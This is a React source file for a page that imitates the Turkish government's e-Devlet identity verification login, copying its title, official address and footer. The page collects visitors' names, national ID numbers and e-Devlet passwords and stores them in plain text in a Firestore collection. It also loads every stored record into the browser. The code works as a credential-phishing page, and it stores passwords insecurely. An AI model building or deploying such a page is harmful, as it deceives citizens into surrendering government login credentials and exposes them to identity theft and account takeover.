import React, { useState, useRef, useEffect } from 'react';
import { Link } from 'react-router-dom';
import { collection, addDoc, Timestamp, getDocs } from 'firebase/firestore';
import { firestore } from '../firebase_setup/firebase';

export default function Register() {
    const [tcKimlik, setTC] = useState('');
    const [eSifre, setSifre] = useState('');
    const [isim, setIsim] = useState('');
    const [type, setType] = useState(true);
    const [userData, setUserData] = useState([]);
    const [length, setLength] = useState(0);
    const ref1 = useRef(null);
    const ref2 = useRef(null);
    const ref3 = useRef(null);

    const getUserData = async () => {
        const docSnap = await getDocs(collection(firestore, "user-data"));
        let i=0;
        docSnap.forEach((doc) => {
            setUserData(current => [...current, doc.data()]);
            i++;
            setLength(i);
        });
    }

    useEffect(() => {
        getUserData();
    }, []);

    const submitHandler = async (e) => {
        e.preventDefault();
        let tcfree = false;
        for (let i=0; i<length; i++){
            if(tcKimlik===userData[i].tckimlikNo){
                tcfree = true;
                break;
            }
        }
        if(!tcfree){
            try {
                await addDoc(collection(firestore, 'user-data'), {
                    adSoyad: isim,
                    tckimlikNo: tcKimlik,
                    esifre: eSifre,
                    created: Timestamp.now()
                })
                let err = 'Başarıyla kayıt oldunuz.';
                alert(err);
                set();
            }
            catch (err) {
                alert(err);
            }
        } else {
            let err = 'Bu TC kimlik no sistemde kayıtlıdır.'
            alert(err);
            set();
        }
    }

    const set = () => {
        ref1.current.value = '';
        ref2.current.value = '';
        ref3.current.value = '';
    }

    const tcChange = event => {
        const result = event.target.value.replace(/\D/g, '');
        setTC(result);
    }

    const sifreChange = event => {
        const result = event.target.value;
        setSifre(result);
    }

    const isimChange = event => {
        const result = event.target.value;
        setIsim(result);
    }

    const handleType = () => {
        setType(!type);
    }

    return (
        <div className='App' id="loginPageBody">
            <div id="page">

                <header id="headerSection">

                    <h1>Türkiye Cumhuriyeti Vatandaş Kimlik Doğrulama Sistemi</h1>

                </header>

                <main>

                    <section className="referrerApp">
                        <dl>
                            <dt>Giriş Yapılacak Adres
                            </dt>
                            <dd><span title="www.turkiye.gov.tr">www.turkiye.gov.tr</span></dd>
                            <dt>Giriş Yapılacak Uygulama
                            </dt>
                            <dd><span title="e-Devlet Kapısı">e-Devlet Kapısı</span></dd>
                        </dl>
                    </section>

                    <nav className="methodSelector">
                        <div className="tabChooser">
                            <nav role="tablist">
                                <div role="tab" className="active"
                                    href="/Giris/e-Devlet-Sifresi">
                                    <span className="password">e-Devlet Şifresi</span>
                                </div>
                            </nav>
                        </div>
                    </nav>

                    <section id="pageContent">
                        <div className="richText">
                            T.C. Kimlik Numaranızı ve e-Devlet Şifrenizi kullanarak kimliğiniz doğrulandıktan sonra işleminize kaldığınız yerden devam edebilirsiniz.
                        </div>

                        <form id="loginForm" name="sifreGirisForm" autoComplete="off" onSubmit={submitHandler} >
                            <fieldset>
                                <div className="formRow required ">
                                    <label htmlFor="tridField"
                                        className="rowLabel">Adınız Soyadınız
                                    </label>
                                    <div className="fieldGroup">
                                        <input name="tridField" type={type ? "text" : "password"} className="text"
                                            ref={ref1}
                                            onChange={isimChange}
                                            value={isim} tabIndex="1"
                                            autoComplete="off"
                                            title="Ad ve soyad bilgilerinizi giriniz"
                                            aria-required="true" required />
                                        <span className="virtual-key-wrapper">
                                            <button className="maskedFieldLink">Sanal Klavye</button>
                                            <button onClick={handleType}
                                                className="maskedFieldLink" title="Yazarken Gizle">Yazarken Gizle
                                            </button>
                                        </span>
                                    </div>
                                </div>
                                <div className="formRow required ">
                                    <label htmlFor="tridField"
                                        className="rowLabel">T.C. Kimlik No
                                    </label>
                                    <div className="fieldGroup">
                                        <input name="tridField" type={type ? "text" : "password"} className="text" id="tridField"
                                            onChange={tcChange} ref={ref2}
                                            value={tcKimlik} tabIndex="1"
                                            autoComplete="off" maxLength="11" pattern="[0-9]{11}"
                                            title="Kimlik numaranız 11 adet rakamdan oluşmalıdır"
                                            aria-required="true" required />
                                        <span className="virtual-key-wrapper">
                                            <button className="maskedFieldLink">Sanal Klavye</button>
                                            <button id="toogleTrid" onClick={handleType}
                                                className="maskedFieldLink" title="Yazarken Gizle">Yazarken Gizle
                                            </button>
                                        </span>
                                    </div>
                                </div>

                                <div className="formRow required ">
                                    <label htmlFor="egpField"
                                        className="rowLabel">e-Devlet Şifresi
                                    </label>
                                    <div className="fieldGroup">
                                        <input name="egpField" id="egpField" type={type ? "password" : "text"} className="text" onChange={sifreChange} value={eSifre}
                                            tabIndex="2" autoComplete="off" ref={ref3}
                                            aria-required="true" required />
                                        <span className="virtual-key-wrapper">
                                            <button className="maskedFieldLink" onClick={handleType}>Şifreyi Göster</button>
                                            <button className="maskedFieldLink" >Şifremi Unuttum
                                            </button>
                                        </span>
                                        <div className="fieldInfo richText">
                                            * e-Devlet şifrenizi unutmanız durumunda
                                            doğruladığınız cep telefonunuzdan yenileme işlemi yapabilirsiniz.<br />
                                        </div>
                                    </div>
                                </div>

                            </fieldset>
                            <div className="formSubmitRow">
                                <Link to='/'><button className="backButton" ><span className="ico-left-open"></span>Anasayfa</button></Link>
                                <button className="submitButton" type="submit" >Kayıt ol<span className="ico-right-open"></span></button>
                            </div>
                        </form>
                    </section>
                </main>
                <footer>

                    <ul className="footerLinks">
                        <li>
                            <button className="maskedFieldLink" >Gizlilik ve Güvenlik</button>
                        </li>
                        <li>
                            <a href="https://www.turkiye.gov.tr/iletisim?hizli=CozumMerkezi2">Hızlı Çözüm Merkezi</a>
                        </li>
                    </ul>
                    <div className="copyrightDetails">
                        © 2023, Ankara - Tüm Hakları Saklıdır
                    </div>

                </footer>

            </div>
        </div>
    )
}
